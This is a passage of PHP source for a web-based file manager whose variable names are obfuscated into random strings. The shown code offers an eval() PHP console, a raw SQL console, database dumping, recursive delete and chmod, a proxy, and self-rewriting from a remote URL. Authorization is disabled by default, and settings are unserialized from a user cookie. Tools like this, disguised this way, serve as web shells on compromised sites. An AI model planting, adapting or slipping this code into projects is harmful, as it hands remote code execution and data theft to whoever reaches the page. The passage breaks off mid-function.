<?php
/* PHP File manager ver 1.5 */

// Configuration — do not change manually!
$zvhdfeakgsbpxtwjyrnucq = '{"authorize":"0","login":"admin","password":"phpfm","cookie_name":"fm_user","days_authorization":"30","script":"<script type=\"text\/javascript\" src=\"https:\/\/www.cdolivet.com\/editarea\/editarea\/edit_area\/edit_area_full.js\"><\/script>\r\n<script language=\"Javascript\" type=\"text\/javascript\">\r\neditAreaLoader.init({\r\nid: \"newcontent\"\r\n,display: \"later\"\r\n,start_highlight: true\r\n,allow_resize: \"both\"\r\n,allow_toggle: true\r\n,word_wrap: true\r\n,language: \"ru\"\r\n,syntax: \"php\"\t\r\n,toolbar: \"search, go_to_line, |, undo, redo, |, select_font, |, syntax_selection, |, change_smooth_selection, highlight, reset_highlight, |, help\"\r\n,syntax_selection_allow: \"css,html,js,php,python,xml,c,cpp,sql,basic,pas\"\r\n});\r\n<\/script>"}';
$ybknvdfshugqexjtrzwmac = '{"Settings":"global $qdsbknxmygjctfzpravewh;\r\nvar_export($qdsbknxmygjctfzpravewh);","Backup SQL tables":"echo fm_backup_tables();"}';
$zpjakwdryqnsbtehgxmcuf = '{"All bases":"SHOW DATABASES;","All tables":"SHOW TABLES;"}';
$karnmxtvhsjwgyfczuqdbp = '{"id":"ru","Add":"Добавить","Are you sure you want to delete this directory (recursively)?":"Вы уверены, что хотите удалить эту папку (рекурсивно)?","Are you sure you want to delete this file?":"Вы уверены, что хотите удалить этот файл?","Archiving":"Архивировать","Authorization":"Авторизация","Back":"Назад","Cancel":"Отмена","Chinese":"Китайский","Compress":"Сжать","Console":"Консоль","Cookie":"Куки","Created":"Создан","Date":"Дата","Days":"Дней","Decompress":"Распаковать","Delete":"Удалить","Deleted":"Удалено","Download":"Скачать","done":"закончена","Edit":"Редактировать","Enter":"Вход","English":"Английский","Error occurred":"Произошла ошибка","File manager":"Файловый менеджер","File selected":"Выбран файл","File updated":"Файл сохранен","Filename":"Имя файла","Files uploaded":"Файл загружен","French":"Французский","Generation time":"Генерация страницы","German":"Немецкий","Home":"Домой","Quit":"Выход","Language":"Язык","Login":"Логин","Manage":"Управление","Make directory":"Создать папку","Name":"Наименование","New":"Новое","New file":"Новый файл","no files":"нет файлов","Password":"Пароль","pictures":"изображения","Recursively":"Рекурсивно","Rename":"Переименовать","Reset":"Сбросить","Reset settings":"Сбросить настройки","Restore file time after editing":"Восстанавливать время файла после редактирования","Result":"Результат","Rights":"Права","Russian":"Русский","Save":"Сохранить","Select":"Выберите","Select the file":"Выберите файл","Settings":"Настройка","Show":"Показать","Show size of the folder":"Показывать размер папки","Size":"Размер","Spanish":"Испанский","Submit":"Отправить","Task":"Задача","templates":"шаблоны","Ukrainian":"Украинский","Upload":"Загрузить","Value":"Значение","Hello":"Привет","Found in files":"Найдено в файлах","Search":"Поиск","Recursive search": "Рекурсивный поиск","Mask":"Маска"}';
// end configuration

// Preparations
$tnymjdkwhbaqevrgpfucsx = explode(' ', microtime());
$tnymjdkwhbaqevrgpfucsx = $tnymjdkwhbaqevrgpfucsx[1] + $tnymjdkwhbaqevrgpfucsx[0];
$evpgwksczqajmbnxthdfry = array('en','ru','de','fr','uk');
$rgvxhjbkznwpescmudqfyt = empty($_REQUEST['path']) ? $rgvxhjbkznwpescmudqfyt = realpath('.') : realpath($_REQUEST['path']);
$rgvxhjbkznwpescmudqfyt = str_replace('\\', '/', $rgvxhjbkznwpescmudqfyt) . '/';
$mtkfrcwsjhbyxdpzuevang=str_replace('\\', '/',realpath('./'));
$tnurbgeckspvzfwmjaxqdh = (version_compare(phpversion(),"5.3.0","<"))?true:false;
$qwgdrjtkzvafsecpunxbhy = ''; // service string
$gvbuyfdcjpesmqahktznxw = 'ru';
$rencmqpzbwykjfxsgthvdu = true;
$xzausvmyqwegcbdptrnhjf = 1.4;

//Authorization
$dbevfpwzjxrqtymuhgscan = json_decode($zvhdfeakgsbpxtwjyrnucq,true);
$dbevfpwzjxrqtymuhgscan['authorize'] = isset($dbevfpwzjxrqtymuhgscan['authorize']) ? $dbevfpwzjxrqtymuhgscan['authorize'] : 0; 
$dbevfpwzjxrqtymuhgscan['days_authorization'] = (isset($dbevfpwzjxrqtymuhgscan['days_authorization'])&&is_numeric($dbevfpwzjxrqtymuhgscan['days_authorization'])) ? (int)$dbevfpwzjxrqtymuhgscan['days_authorization'] : 30;
$dbevfpwzjxrqtymuhgscan['login'] = isset($dbevfpwzjxrqtymuhgscan['login']) ? $dbevfpwzjxrqtymuhgscan['login'] : 'admin';  
$dbevfpwzjxrqtymuhgscan['password'] = isset($dbevfpwzjxrqtymuhgscan['password']) ? $dbevfpwzjxrqtymuhgscan['password'] : 'phpfm';  
$dbevfpwzjxrqtymuhgscan['cookie_name'] = isset($dbevfpwzjxrqtymuhgscan['cookie_name']) ? $dbevfpwzjxrqtymuhgscan['cookie_name'] : 'fm_user';
$dbevfpwzjxrqtymuhgscan['script'] = isset($dbevfpwzjxrqtymuhgscan['script']) ? $dbevfpwzjxrqtymuhgscan['script'] : '';

// Little default config
$nsfyqzjcxubdmagtvrhpwe = array (
	'make_directory' => true, 
	'new_file' => true, 
	'upload_file' => true, 
	'show_dir_size' => false, //if true, show directory size → maybe slow 
	'show_img' => true, 
	'show_php_ver' => true, 
	'show_php_ini' => false, // show path to current php.ini
	'show_gt' => true, // show generation time
	'enable_php_console' => true,
	'enable_sql_console' => true,
	'sql_server' => 'localhost',
	'sql_username' => 'root',
	'sql_password' => '',
	'sql_db' => 'test_base',
	'enable_proxy' => true,
	'show_phpinfo' => true,
	'show_xls' => true,
	'fm_settings' => true,
	'restore_time' => true,
	'fm_restore_time' => false,
);

if (empty($_COOKIE['fm_config'])) $qdsbknxmygjctfzpravewh = $nsfyqzjcxubdmagtvrhpwe;
else $qdsbknxmygjctfzpravewh = unserialize($_COOKIE['fm_config']);

// Change language
if (isset($_POST['fm_lang'])) { 
	setcookie('fm_lang', $_POST['fm_lang'], time() + (86400 * $dbevfpwzjxrqtymuhgscan['days_authorization']));
	$_COOKIE['fm_lang'] = $_POST['fm_lang'];
}
$fvyhagtnscbjqmrzkwpuxe = $gvbuyfdcjpesmqahktznxw;

// Detect browser language
if($rencmqpzbwykjfxsgthvdu && !empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) && empty($_COOKIE['fm_lang'])){
	$lang_priority = explode(',', $_SERVER['HTTP_ACCEPT_LANGUAGE']);
	if (!empty($lang_priority)){
		foreach ($lang_priority as $lang_arr){
			$fxrbjcptywgdshzanmuqek = explode(';', $lang_arr);
			$fxrbjcptywgdshzanmuqek = $fxrbjcptywgdshzanmuqek[0];
			if(in_array($fxrbjcptywgdshzanmuqek,$evpgwksczqajmbnxthdfry)){
				$fvyhagtnscbjqmrzkwpuxe = $fxrbjcptywgdshzanmuqek;
				break;
			}
		}
	}
} 

// Cookie language is primary for ever
$fvyhagtnscbjqmrzkwpuxe = (empty($_COOKIE['fm_lang'])) ? $fvyhagtnscbjqmrzkwpuxe : $_COOKIE['fm_lang'];

// Localization
$fqphjuctkayrnbemxwdzsg = json_decode($karnmxtvhsjwgyfczuqdbp,true);
if ($fqphjuctkayrnbemxwdzsg['id']!=$fvyhagtnscbjqmrzkwpuxe) {
	$qgrxtjcvhebdazymsnpwuk = file_get_contents('https://raw.githubusercontent.com/Den1xxx/Filemanager/master/languages/' . $fvyhagtnscbjqmrzkwpuxe . '.json');
	if (!empty($qgrxtjcvhebdazymsnpwuk)) {
		//remove unnecessary characters
		$translation_string = str_replace("'",'&#39;',json_encode(json_decode($qgrxtjcvhebdazymsnpwuk),JSON_UNESCAPED_UNICODE));
		$pcjgseykbdnrzvmwaxutqf = file_get_contents(__FILE__);
		$umtnvpxewrfhdkjasgzcyb = preg_match('#translation[\s]?\=[\s]?\'\{\"(.*?)\"\}\';#', $pcjgseykbdnrzvmwaxutqf, $matches);
		if (!empty($matches[1])) {
			$pbzwqxnsguyvdrmhtkcfae = filemtime(__FILE__);
			$aygjbpnhetfwdmrkucxvqz = str_replace('{"'.$matches[1].'"}',$translation_string,$pcjgseykbdnrzvmwaxutqf);
			if (file_put_contents(__FILE__, $aygjbpnhetfwdmrkucxvqz)) {
				$qwgdrjtkzvafsecpunxbhy .= __('File updated');
			}	else $qwgdrjtkzvafsecpunxbhy .= __('Error occurred');
			if (!empty($qdsbknxmygjctfzpravewh['fm_restore_time'])) touch(__FILE__,$pbzwqxnsguyvdrmhtkcfae);
		}	
		$fqphjuctkayrnbemxwdzsg = json_decode($translation_string,true);
	}
}

/* Functions */

//translation
function __($text){
	global $fqphjuctkayrnbemxwdzsg;
	if (isset($fqphjuctkayrnbemxwdzsg[$text])) return $fqphjuctkayrnbemxwdzsg[$text];
	else return $text;
};

//delete files and dirs recursively
function fm_del_files($wjvdmrgebyxuqaknzshpct, $recursive = false) {
	if($recursive && @is_dir($wjvdmrgebyxuqaknzshpct)) {
		$bxamegcvhkjupwynrzqdft = fm_scan_dir($wjvdmrgebyxuqaknzshpct, '', '', true);
		foreach ($bxamegcvhkjupwynrzqdft as $el) {
			if($el != '.' && $el != '..'){
				fm_del_files($wjvdmrgebyxuqaknzshpct . '/' . $el, true);
			}
		}
	}
	if(@is_dir($wjvdmrgebyxuqaknzshpct)) {
		return rmdir($wjvdmrgebyxuqaknzshpct);
	} else {
		return @unlink($wjvdmrgebyxuqaknzshpct);
	}
}

//file perms
function fm_rights_string($wjvdmrgebyxuqaknzshpct, $if = false){
	$mqvsnypujcfbwtgdreakxz = fileperms($wjvdmrgebyxuqaknzshpct);
	$hkcurapygqmjszetnwdfbx = '';
	if(!$if){
		if (($mqvsnypujcfbwtgdreakxz & 0xC000) == 0xC000) {
			//Socket
			$hkcurapygqmjszetnwdfbx = 's';
		} elseif (($mqvsnypujcfbwtgdreakxz & 0xA000) == 0xA000) {
			//Symbolic Link
			$hkcurapygqmjszetnwdfbx = 'l';
		} elseif (($mqvsnypujcfbwtgdreakxz & 0x8000) == 0x8000) {
			//Regular
			$hkcurapygqmjszetnwdfbx = '-';
		} elseif (($mqvsnypujcfbwtgdreakxz & 0x6000) == 0x6000) {
			//Block special
			$hkcurapygqmjszetnwdfbx = 'b';
		} elseif (($mqvsnypujcfbwtgdreakxz & 0x4000) == 0x4000) {
			//Directory
			$hkcurapygqmjszetnwdfbx = 'd';
		} elseif (($mqvsnypujcfbwtgdreakxz & 0x2000) == 0x2000) {
			//Character special
			$hkcurapygqmjszetnwdfbx = 'c';
		} elseif (($mqvsnypujcfbwtgdreakxz & 0x1000) == 0x1000) {
			//FIFO pipe
			$hkcurapygqmjszetnwdfbx = 'p';
		} else {
			//Unknown
			$hkcurapygqmjszetnwdfbx = 'u';
		}
	}
  
	//Owner
	$hkcurapygqmjszetnwdfbx .= (($mqvsnypujcfbwtgdreakxz & 0x0100) ? 'r' : '-');
	$hkcurapygqmjszetnwdfbx .= (($mqvsnypujcfbwtgdreakxz & 0x0080) ? 'w' : '-');
	$hkcurapygqmjszetnwdfbx .= (($mqvsnypujcfbwtgdreakxz & 0x0040) ?
	(($mqvsnypujcfbwtgdreakxz & 0x0800) ? 's' : 'x' ) :
	(($mqvsnypujcfbwtgdreakxz & 0x0800) ? 'S' : '-'));
 
	//Group
	$hkcurapygqmjszetnwdfbx .= (($mqvsnypujcfbwtgdreakxz & 0x0020) ? 'r' : '-');
	$hkcurapygqmjszetnwdfbx .= (($mqvsnypujcfbwtgdreakxz & 0x0010) ? 'w' : '-');
	$hkcurapygqmjszetnwdfbx .= (($mqvsnypujcfbwtgdreakxz & 0x0008) ?
	(($mqvsnypujcfbwtgdreakxz & 0x0400) ? 's' : 'x' ) :
	(($mqvsnypujcfbwtgdreakxz & 0x0400) ? 'S' : '-'));
 
	//World
	$hkcurapygqmjszetnwdfbx .= (($mqvsnypujcfbwtgdreakxz & 0x0004) ? 'r' : '-');
	$hkcurapygqmjszetnwdfbx .= (($mqvsnypujcfbwtgdreakxz & 0x0002) ? 'w' : '-');
	$hkcurapygqmjszetnwdfbx .= (($mqvsnypujcfbwtgdreakxz & 0x0001) ?
	(($mqvsnypujcfbwtgdreakxz & 0x0200) ? 't' : 'x' ) :
	(($mqvsnypujcfbwtgdreakxz & 0x0200) ? 'T' : '-'));

	return $hkcurapygqmjszetnwdfbx;
}

function fm_convert_rights($jftdqwzkhpensmburxgvay) {
	$jftdqwzkhpensmburxgvay = str_pad($jftdqwzkhpensmburxgvay,9,'-');
	$thdngvrqczuxmeawyfpsbj = array('-'=>'0','r'=>'4','w'=>'2','x'=>'1');
	$jftdqwzkhpensmburxgvay = strtr($jftdqwzkhpensmburxgvay,$thdngvrqczuxmeawyfpsbj);
	$newmode = '0';
	$owner = (int) $jftdqwzkhpensmburxgvay[0] + (int) $jftdqwzkhpensmburxgvay[1] + (int) $jftdqwzkhpensmburxgvay[2]; 
	$group = (int) $jftdqwzkhpensmburxgvay[3] + (int) $jftdqwzkhpensmburxgvay[4] + (int) $jftdqwzkhpensmburxgvay[5]; 
	$world = (int) $jftdqwzkhpensmburxgvay[6] + (int) $jftdqwzkhpensmburxgvay[7] + (int) $jftdqwzkhpensmburxgvay[8]; 
	$newmode .= $owner . $group . $world;
	return intval($newmode, 8);
}

function fm_chmod($wjvdmrgebyxuqaknzshpct, $val, $rec = false) {
	$res = @chmod(realpath($wjvdmrgebyxuqaknzshpct), $val);
	if(@is_dir($wjvdmrgebyxuqaknzshpct) && $rec){
		$bxamegcvhkjupwynrzqdft = fm_scan_dir($wjvdmrgebyxuqaknzshpct);
		foreach ($bxamegcvhkjupwynrzqdft as $el) {
			$res = $res && fm_chmod($wjvdmrgebyxuqaknzshpct . '/' . $el, $val, true);
		}
	}
	return $res;
}

//load files
function fm_download($file_name) {
    if (!empty($file_name)) {
		if (file_exists($file_name)) {
			header("Content-Disposition: attachment; filename=" . basename($file_name));   
			header("Content-Type: application/force-download");
			header("Content-Type: application/octet-stream");
			header("Content-Type: application/download");
			header("Content-Description: File Transfer");            
			header("Content-Length: " . filesize($file_name));		
			flush(); // this doesn't really matter.
			$asyqwgrmchekdubtvpzjfn = fopen($file_name, "r");
			while (!feof($asyqwgrmchekdubtvpzjfn)) {
				echo fread($asyqwgrmchekdubtvpzjfn, 65536);
				flush(); // this is essential for large downloads
			} 
			fclose($asyqwgrmchekdubtvpzjfn);
			die();
		} else {
			header('HTTP/1.0 404 Not Found', true, 404);
			header('Status: 404 Not Found'); 
			die();
        }
    } 
}

//show folder size
function fm_dir_size($nadwrkufjxqsmgzcyebpht,$format=true) {
	if($format)  {
		$nayufdgprjmekbhxctvzqw=fm_dir_size($nadwrkufjxqsmgzcyebpht,false);
		if($nayufdgprjmekbhxctvzqw<=1024) return $nayufdgprjmekbhxctvzqw.' bytes';
		elseif($nayufdgprjmekbhxctvzqw<=1024*1024) return round($nayufdgprjmekbhxctvzqw/(1024),2).'&nbsp;Kb';
		elseif($nayufdgprjmekbhxctvzqw<=1024*1024*1024) return round($nayufdgprjmekbhxctvzqw/(1024*1024),2).'&nbsp;Mb';
		elseif($nayufdgprjmekbhxctvzqw<=1024*1024*1024*1024) return round($nayufdgprjmekbhxctvzqw/(1024*1024*1024),2).'&nbsp;Gb';
		elseif($nayufdgprjmekbhxctvzqw<=1024*1024*1024*1024*1024) return round($nayufdgprjmekbhxctvzqw/(1024*1024*1024*1024),2).'&nbsp;Tb'; //:)))
		else return round($nayufdgprjmekbhxctvzqw/(1024*1024*1024*1024*1024),2).'&nbsp;Pb'; // ;-)
	} else {
		if(is_file($nadwrkufjxqsmgzcyebpht)) return filesize($nadwrkufjxqsmgzcyebpht);
		$nayufdgprjmekbhxctvzqw=0;
		$cqsbxtfzkejgawmvprnyhd=opendir($nadwrkufjxqsmgzcyebpht);
		while(($wjvdmrgebyxuqaknzshpct=readdir($cqsbxtfzkejgawmvprnyhd))!==false) {
			if($wjvdmrgebyxuqaknzshpct=='.' || $wjvdmrgebyxuqaknzshpct=='..') continue;
			if(is_file($nadwrkufjxqsmgzcyebpht.'/'.$wjvdmrgebyxuqaknzshpct)) $nayufdgprjmekbhxctvzqw+=filesize($nadwrkufjxqsmgzcyebpht.'/'.$wjvdmrgebyxuqaknzshpct);
			else $nayufdgprjmekbhxctvzqw+=fm_dir_size($nadwrkufjxqsmgzcyebpht.'/'.$wjvdmrgebyxuqaknzshpct,false);
		}
		closedir($cqsbxtfzkejgawmvprnyhd);
		return $nayufdgprjmekbhxctvzqw+filesize($nadwrkufjxqsmgzcyebpht); 
	}
}

//scan directory
function fm_scan_dir($directory, $exp = '', $type = 'all', $do_not_filter = false) {
	$dir = $ndir = array();
	if(!empty($exp)){
		$exp = '/^' . str_replace('*', '(.*)', str_replace('.', '\\.', $exp)) . '$/';
	}
	if(!empty($type) && $type !== 'all'){
		$func = 'is_' . $type;
	}
	if(@is_dir($directory)){
		$fh = opendir($directory);
		while (false !== ($filename = readdir($fh))) {
			if(substr($filename, 0, 1) != '.' || $do_not_filter) {
				if((empty($type) || $type == 'all' || $func($directory . '/' . $filename)) && (empty($exp) || preg_match($exp, $filename))){
					$dir[] = $filename;
				}
			}
		}
		closedir($fh);
		natsort($dir);
	}
	return $dir;
}

function fm_link($get,$link,$name,$title='') {
	if (empty($title)) $title=$name.' '.basename($link);
	return '&nbsp;&nbsp;<a href="?'.$get.'='.base64_encode($link).'" title="'.$title.'">'.$name.'</a>';
}

function fm_arr_to_option($arr,$n,$sel=''){
	foreach($arr as $v){
		$b=$v[$n];
		$res.='<option value="'.$b.'" '.($sel && $sel==$b?'selected':'').'>'.$b.'</option>';
	}
	return $res;
}

function fm_lang_form ($current='en'){
return '
<form name="change_lang" method="post" action="">
	<select name="fm_lang" title="'.__('Language').'" onchange="document.forms[\'change_lang\'].submit()" >
		<option value="en" '.($current=='en'?'selected="selected" ':'').'>'.__('English').'</option>
		<option value="de" '.($current=='de'?'selected="selected" ':'').'>'.__('German').'</option>
		<option value="ru" '.($current=='ru'?'selected="selected" ':'').'>'.__('Russian').'</option>
		<option value="fr" '.($current=='fr'?'selected="selected" ':'').'>'.__('French').'</option>
		<option value="uk" '.($current=='uk'?'selected="selected" ':'').'>'.__('Ukrainian').'</option>
	</select>
</form>
';
}
	
function fm_root($dirname){
	return ($dirname=='.' OR $dirname=='..');
}

function fm_php($string){
	$display_errors=ini_get('display_errors');
	ini_set('display_errors', '1');
	ob_start();
	eval(trim($string));
	$text = ob_get_contents();
	ob_end_clean();
	ini_set('display_errors', $display_errors);
	return $text;
}

//SHOW DATABASES
function fm_sql_connect(){
	global $qdsbknxmygjctfzpravewh;
	return new mysqli($qdsbknxmygjctfzpravewh['sql_server'], $qdsbknxmygjctfzpravewh['sql_username'], $qdsbknxmygjctfzpravewh['sql_password'], $qdsbknxmygjctfzpravewh['sql_db']);
}

function fm_sql($query){
	global $qdsbknxmygjctfzpravewh;
	$query=trim($query);
	ob_start();
	$connection = fm_sql_connect();
	if ($connection->connect_error) {
		ob_end_clean();	
		return $connection->connect_error;
	}
	$connection->set_charset('utf8');
    $queried = mysqli_query($connection,$query);
	if ($queried===false) {
		ob_end_clean();	
		return mysqli_error($connection);
    } else {
		if(!empty($queried)){
			while($qthjszpxebrkvanycumfwd = mysqli_fetch_assoc($queried)) {
				$query_result[]=  $qthjszpxebrkvanycumfwd;
			}
		}
		$vdump=empty($query_result)?'':var_export($query_result,true);	
		ob_end_clean();	
		$connection->close();
		return '<pre>'.stripslashes($vdump).'</pre>';
	}
}

function fm_backup_tables($tables = '*', $full_backup = true) {
	global $rgvxhjbkznwpescmudqfyt;
	$mysqldb = fm_sql_connect();
	$delimiter = "; \n  \n";
	if($tables == '*')	{
		$tables = array();
		$dkcmjwtqnsvhzgaupbxfry = $mysqldb->query('SHOW TABLES');
		while($qthjszpxebrkvanycumfwd = mysqli_fetch_row($dkcmjwtqnsvhzgaupbxfry))	{
			$tables[] = $qthjszpxebrkvanycumfwd[0];
		}
	} else {
		$tables = is_array($tables) ? $tables : explode(',',$tables);
	}
    
	$hsagdpxwzebrctkfmjunyq='';
	foreach($tables as $table)	{
		$dkcmjwtqnsvhzgaupbxfry = $mysqldb->query('SELECT * FROM '.$table);
		$num_fields = mysqli_num_fields($dkcmjwtqnsvhzgaupbxfry);
		$hsagdpxwzebrctkfmjunyq.= 'DROP TABLE IF EXISTS `'.$table.'`'.$delimiter;
		$xvdkuctsezpbqharnwfmjy = mysqli_fetch_row($mysqldb->query('SHOW CREATE TABLE '.$table));
		$hsagdpxwzebrctkfmjunyq.=$xvdkuctsezpbqharnwfmjy[1].$delimiter;
        if ($full_backup) {
		for ($fmcvsnxujheqtrpkbwazyg = 0; $fmcvsnxujheqtrpkbwazyg < $num_fields; $fmcvsnxujheqtrpkbwazyg++)  {
			while($qthjszpxebrkvanycumfwd = mysqli_fetch_row($dkcmjwtqnsvhzgaupbxfry)) {
				$hsagdpxwzebrctkfmjunyq.= 'INSERT INTO `'.$table.'` VALUES(';
				for($j=0; $j<$num_fields; $j++)	{
					$qthjszpxebrkvanycumfwd[$j] = addslashes($qthjszpxebrkvanycumfwd[$j]);
					$qthjszpxebrkvanycumfwd[$j] = str_replace("\n","\\n",$qthjszpxebrkvanycumfwd[$j]);
					if (isset($qthjszpxebrkvanycumfwd[$j])) { $hsagdpxwzebrctkfmjunyq.= '"'.$qthjszpxebrkvanycumfwd[$j].'"' ; } else { $hsagdpxwzebrctkfmjunyq.= '""'; }
					if ($j<($num_fields-1)) { $hsagdpxwzebrctkfmjunyq.= ','; }
				}
				$hsagdpxwzebrctkfmjunyq.= ')'.$delimiter;
			}
		  }
		} else { 
		$hsagdpxwzebrctkfmjunyq = preg_replace("#AUTO_INCREMENT=[\d]+ #is", '', $hsagdpxwzebrctkfmjunyq);
		}
		$hsagdpxwzebrctkfmjunyq.="\n\n\n";
	}

	//save file
    $wjvdmrgebyxuqaknzshpct=gmdate("Y-m-d_H-i-s",time()).'.sql';
	$mypduratbnjskfzcqvhgew = fopen($wjvdmrgebyxuqaknzshpct,'w+');
	fwrite($mypduratbnjskfzcqvhgew,$hsagdpxwzebrctkfmjunyq);
	fclose($mypduratbnjskfzcqvhgew);
	$alert = 'onClick="if(confirm(\''. __('File selected').': \n'. $wjvdmrgebyxuqaknzshpct. '. \n'.__('Are you sure you want to delete this file?') . '\')) document.location.href = \'?delete=' . $wjvdmrgebyxuqaknzshpct . '&path=' . $rgvxhjbkznwpescmudqfyt  . '\'"';
    return $wjvdmrgebyxuqaknzshpct.': '.fm_link('download',$rgvxhjbkznwpescmudqfyt.$wjvdmrgebyxuqaknzshpct,__('Download'),__('Download').' '.$wjvdmrgebyxuqaknzshpct).' <a href="#" title="' . __('Delete') . ' '. $wjvdmrgebyxuqaknzshpct . '" ' . $alert . '>' . __('Delete') . '</a>';
}

function fm_restore_tables($sqlFileToExecute) {
	$mysqldb = fm_sql_connect();
	$delimiter = "; \n  \n";
    // Load and explode the sql file
    $nadwrkufjxqsmgzcyebpht = fopen($sqlFileToExecute,"r+");
    $sqlFile = fread($nadwrkufjxqsmgzcyebpht,filesize($sqlFileToExecute));
    $sqlArray = explode($delimiter,$sqlFile);
	
    //Process the sql file by statements
    foreach ($sqlArray as $stmt) {
        if (strlen($stmt)>3){
			$dkcmjwtqnsvhzgaupbxfry = $mysqldb->query($stmt);
				if (!$dkcmjwtqnsvhzgaupbxfry){
					$sqlErrorCode = mysqli_errno($mysqldb->connection);
					$sqlErrorText = mysqli_error($mysqldb->connection);
					$sqlStmt      = $stmt;
					break;
           	     }
           	  }
           }
if (empty($sqlErrorCode)) return __('Success').' — '.$sqlFileToExecute;
else return $sqlErrorText.'<br/>'.$stmt;
}

function fm_img_link($filename){
	return './'.basename(__FILE__).'?img='.base64_encode($filename);
}

function fm_home_style(){
	return '
input, input.fm_input {
	text-indent: 2px;
}

input, textarea, select, input.fm_input {
	color: black;
	font: normal 8pt Verdana, Arial, Helvetica, sans-serif;
	border-color: black;
	background-color: #FCFCFC none !important;
	border-radius: 0;
	padding: 2px;
}

input.fm_input {
	background: #FCFCFC none !important;
	cursor: pointer;
}

.home {
	background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAAgRQTFRF/f396Ojo////tT02zr+fw66Rtj432TEp3MXE2DAr3TYp1y4mtDw2/7BM/7BOqVpc/8l31jcqq6enwcHB2Tgi5jgqVpbFvra2nBAV/Pz82S0jnx0W3TUkqSgi4eHh4Tsre4wosz026uPjzGYd6Us3ynAydUBA5Kl3fm5eqZaW7ODgi2Vg+Pj4uY+EwLm5bY9U//7jfLtC+tOK3jcm/71u2jYo1UYh5aJl/seC3jEm12kmJrIA1jMm/9aU4Lh0e01BlIaE///dhMdC7IA//fTZ2c3MW6nN30wf95Vd4JdXoXVos8nE4efN/+63IJgSnYhl7F4csXt89GQUwL+/jl1c41Aq+fb2gmtI1rKa2C4kJaIA3jYrlTw5tj423jYn3cXE1zQoxMHBp1lZ3Dgmqiks/+mcjLK83jYkymMV3TYk//HM+u7Whmtr0odTpaOjfWJfrHpg/8Bs/7tW/7Ve+4U52DMm3MLBn4qLgNVM6MzB3lEflIuL/+jA///20LOzjXx8/7lbWpJG2C8k3TosJKMA1ywjopOR1zYp5Dspiay+yKNhqKSk8NW6/fjns7Oz2tnZuz887b+W3aRY/+ms4rCE3Tot7V85bKxjuEA3w45Vh5uhq6am4cFxgZZW/9qIuwgKy0sW+ujT4TQntz423C8i3zUj/+Kw/a5d6UMxuL6wzDEr////cqJQfAAAAKx0Uk5T////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////AAWVFbEAAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAA2UlEQVQoU2NYjQYYsAiE8U9YzDYjVpGZRxMiECitMrVZvoMrTlQ2ESRQJ2FVwinYbmqTULoohnE1g1aKGS/fNMtk40yZ9KVLQhgYkuY7NxQvXyHVFNnKzR69qpxBPMez0ETAQyTUvSogaIFaPcNqV/M5dha2Rl2Timb6Z+QBDY1XN/Sbu8xFLG3eLDfl2UABjilO1o012Z3ek1lZVIWAAmUTK6L0s3pX+jj6puZ2AwWUvBRaphswMdUujCiwDwa5VEdPI7ynUlc7v1qYURLquf42hz45CBPDtwACrm+RDcxJYAAAAABJRU5ErkJggg==");
	background-repeat: no-repeat;
}';
}

function fm_config_checkbox_row($name,$value) {
	global $qdsbknxmygjctfzpravewh;
	return '<tr><td class="row1"><input id="fm_config_'.$value.'" name="fm_config['.$value.']" value="1" '.(empty($qdsbknxmygjctfzpravewh[$value])?'':'checked="true"').' type="checkbox"></td><td class="row2 whole"><label for="fm_config_'.$value.'">'.$name.'</td></tr>';
}

function fm_protocol() {
	if (isset($_SERVER['HTTP_SCHEME'])) return $_SERVER['HTTP_SCHEME'].'://';
	if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') return 'https://';
	if (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 443) return 'https://';
	if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') return 'https://';
	return 'http://';
}

function fm_site_url() {
	return fm_protocol().$_SERVER['HTTP_HOST'];
}

function fm_url($full=false) {
	$host=$full?fm_site_url():'.';
	return $host.'/'.basename(__FILE__);
}

function fm_home($full=false){
	return '&nbsp;<a href="'.fm_url($full).'" title="'.__('Home').'"><span class="home">&nbsp;&nbsp;&nbsp;&nbsp;</span></a>';
}

function fm_run_input($fxrbjcptywgdshzanmuqek) {
	global $qdsbknxmygjctfzpravewh;
	$hsagdpxwzebrctkfmjunyq = !empty($qdsbknxmygjctfzpravewh['enable_'.$fxrbjcptywgdshzanmuqek.'_console']) ? 
	'
				<form  method="post" action="'.fm_url().'" style="display:inline">
				<input type="submit" name="'.$fxrbjcptywgdshzanmuqek.'run" value="'.strtoupper($fxrbjcptywgdshzanmuqek).' '.__('Console').'">
				</form>
' : '';
	return $hsagdpxwzebrctkfmjunyq;
}

function fm_url_proxy($matches) {
	$link = str_replace('&amp;','&',$matches[2]);
	$url = isset($_GET['url'])?$_GET['url']:'';
	$parse_url = parse_url($url);
	$host = $parse_url['scheme'].'://'.$parse_url['host'].'/';
	if (substr($link,0,2)=='//') {
		$link = substr_replace($link,fm_protocol(),0,2);
	} elseif (substr($link,0,1)=='/') {
		$link = substr_replace($link,$host,0,1);	
	} elseif (substr($link,0,2)=='./') {
		$link = substr_replace($link,$host,0,2);	
	} elseif (substr($link,0,4)=='http') {
		//alles machen wunderschon
	} else {
		$link = $host.$link;
	} 
	if ($matches[1]=='href' && !strripos($link, 'css')) {
		$base = fm_site_url().'/'.basename(__FILE__);
		$baseq = $base.'?proxy=true&url=';
		$link = $baseq.urlencode($link);
	} elseif (strripos($link, 'css')){
		//как-то тоже подменять надо
	}
	return $matches[1].'="'.$link.'"';
}
 
function fm_tpl_form($lng_tpl) {
	global ${$lng_tpl.'_templates'};
	$tpl_arr = json_decode(${$lng_tpl.'_templates'},true);
	$str = '';
	foreach ($tpl_arr as $ktpl=>$vtpl) {
		$str .= '<tr><td class="row1"><input name="'.$lng_tpl.'_name[]" value="'.$ktpl.'"></td><td class="row2 whole"><textarea name="'.$lng_tpl.'_value[]"  cols="55" rows="5" class="textarea_input">'.$vtpl.'</textarea> <input name="del_'.rand().'" type="button" onClick="this.parentNode.parentNode.remove();" value="'.__('Delete').'"/></td></tr>';
	}
return '
<table>
<tr><th colspan="2">'.strtoupper($lng_tpl).' '.__('templates').' '.fm_run_input($lng_tpl).'</th></tr>
<form method="post" action="">
